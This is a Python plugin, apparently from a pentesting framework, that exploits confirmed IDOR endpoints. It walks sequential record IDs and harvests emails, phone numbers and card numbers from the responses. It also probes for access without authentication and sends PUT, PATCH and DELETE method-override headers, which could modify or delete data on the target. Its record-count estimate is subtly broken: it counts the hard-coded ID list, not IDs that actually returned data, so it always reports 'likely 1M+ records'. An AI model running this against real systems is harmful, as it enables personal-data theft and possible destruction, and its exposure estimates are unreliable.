"""IDOR deep enumeration — assesses scope of data exposure via confirmed IDOR."""

from __future__ import annotations

import re
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

# PII detection patterns
_EMAIL_RE = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
_PHONE_RE = re.compile(r'(?:\+7|8)[\s-]?\(?\d{3}\)?[\s-]?\d{3}[\s-]?\d{2}[\s-]?\d{2}')
_CARD_RE = re.compile(r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b')

# IDs to enumerate: sequential + boundary
ENUM_IDS = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 20, 0, -1, 999999]


class IdorExploitPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="idor_exploit",
        display_name="IDOR Deep Enumeration",
        category=PluginCategory.PENTESTING,
        description="Enumerates confirmed IDOR endpoints to assess data exposure scope",
        depends_on=["idor_check"],
        produces=["idor_exploit_results"],
        timeout=45.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        idor_key = f"idor_check:{target.host}"
        idor_result = ctx.pipeline.get(idor_key)

        if not idor_result or not idor_result.ok:
            return PluginResult.skipped(
                self.meta.name, target.host,
                reason="idor_check results not available",
            )

        idor_endpoints = idor_result.data.get("idor_endpoints", [])
        if not idor_endpoints:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("No confirmed IDOR endpoints to enumerate")],
                data={},
            )

        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available"
            )

        findings: list[Finding] = []
        enum_results: list[dict] = []

        for ep in idor_endpoints:
            if ctx.should_stop:
                break

            url_template = ep.get("url", "") if isinstance(ep, dict) else str(ep)
            param = ep.get("param", "id") if isinstance(ep, dict) else "id"

            if not url_template:
                continue

            result = await self._enumerate_endpoint(
                ctx, target, url_template, param,
            )
            if result:
                enum_results.append(result)

                pii_types = result.get("pii_types", [])
                unique_records = result.get("unique_records", 0)
                estimated_total = result.get("estimated_total", "unknown")

                if pii_types:
                    findings.append(Finding.critical(
                        f"IDOR exposes PII: {', '.join(pii_types)}",
                        description=(
                            f"Endpoint {url_template} leaks {', '.join(pii_types)} "
                            f"for {unique_records} enumerated records. "
                            f"Estimated total: {estimated_total}"
                        ),
                        evidence=f"Parameter: {param}, Records sampled: {unique_records}",
                        remediation=(
                            "Implement proper authorization checks. "
                            "Use UUIDs instead of sequential IDs."
                        ),
                        tags=["pentesting", "idor", "pii-leak"],
                    ))
                elif unique_records > 0:
                    findings.append(Finding.high(
                        f"IDOR enumerable: {unique_records} records accessed",
                        description=(
                            f"Endpoint {url_template} returns data for "
                            f"enumerated IDs. Estimated total: {estimated_total}"
                        ),
                        evidence=f"Parameter: {param}",
                        remediation="Implement proper authorization checks",
                        tags=["pentesting", "idor"],
                    ))

            # Test authorization bypass
            bypass = await self._test_auth_bypass(ctx, url_template, param)
            if bypass:
                enum_results.append(bypass)
                findings.append(Finding.critical(
                    "IDOR accessible without authentication",
                    description=(
                        f"Endpoint {url_template} returns data even without "
                        f"Authorization header"
                    ),
                    evidence=f"Bypass method: {bypass.get('method', 'unknown')}",
                    remediation="Enforce authentication on all data endpoints",
                    tags=["pentesting", "idor", "auth-bypass"],
                ))

        if not findings:
            findings.append(Finding.info(
                "IDOR endpoints could not be further exploited",
                tags=["pentesting", "idor"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"enumeration_results": enum_results},
        )

    async def _enumerate_endpoint(
        self, ctx, target, url_template: str, param: str,
    ) -> dict | None:
        """Enumerate IDs on an IDOR endpoint and analyze responses."""
        unique_bodies: set[str] = set()
        valid_count = 0
        all_pii: set[str] = set()
        sample_sizes: list[int] = []

        for id_val in ENUM_IDS:
            if ctx.should_stop:
                break

            url = self._build_url(url_template, param, str(id_val), target.host)
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(url, timeout=8.0)
                    if resp.status != 200:
                        continue

                    body = await resp.text(encoding="utf-8", errors="replace")
                    body_hash = str(hash(body[:500]))

                    if body_hash not in unique_bodies:
                        unique_bodies.add(body_hash)
                        valid_count += 1
                        sample_sizes.append(len(body))

                        # Check for PII
                        if _EMAIL_RE.search(body):
                            all_pii.add("email")
                        if _PHONE_RE.search(body):
                            all_pii.add("phone")
                        if _CARD_RE.search(body):
                            all_pii.add("credit_card")
            except Exception:
                continue

        if valid_count == 0:
            return None

        # Extrapolate total records
        sequential_hits = sum(
            1 for id_val in range(1, 21)
            if id_val in ENUM_IDS[:17]  # IDs 1-20
        )
        if sequential_hits >= 10:
            estimated = "likely 1M+ records (all sequential IDs valid)"
        elif sequential_hits >= 5:
            estimated = f"likely 10K+ records ({sequential_hits}/20 IDs valid)"
        else:
            estimated = f"~{valid_count} accessible records"

        return {
            "url": url_template,
            "param": param,
            "unique_records": valid_count,
            "estimated_total": estimated,
            "pii_types": sorted(all_pii),
            "avg_response_size": (
                sum(sample_sizes) // len(sample_sizes) if sample_sizes else 0
            ),
        }

    async def _test_auth_bypass(
        self, ctx, url_template: str, param: str,
    ) -> dict | None:
        """Test if IDOR endpoint is accessible without auth headers."""
        url = self._build_url(url_template, param, "1", "")

        # Try without auth header
        try:
            async with ctx.rate:
                resp = await ctx.http.get(
                    url, timeout=8.0,
                    headers={"Authorization": "", "Cookie": ""},
                )
                if resp.status == 200:
                    body = await resp.text(encoding="utf-8", errors="replace")
                    if len(body) > 50:
                        return {
                            "method": "no_auth_header",
                            "url": url,
                            "status": 200,
                        }
        except Exception:
            pass

        # Try method override: GET → DELETE
        for method_name in ("PUT", "PATCH", "DELETE"):
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(
                        url, timeout=8.0,
                        headers={"X-HTTP-Method-Override": method_name},
                    )
                    if resp.status in (200, 204):
                        return {
                            "method": f"method_override_{method_name}",
                            "url": url,
                            "status": resp.status,
                        }
            except Exception:
                continue

        return None

    @staticmethod
    def _build_url(url_template: str, param: str, id_val: str, host: str) -> str:
        """Build URL by replacing ID placeholder or appending param."""
        if "{id}" in url_template:
            return url_template.replace("{id}", id_val)
        sep = "&" if "?" in url_template else "?"
        return f"{url_template}{sep}{param}={id_val}"
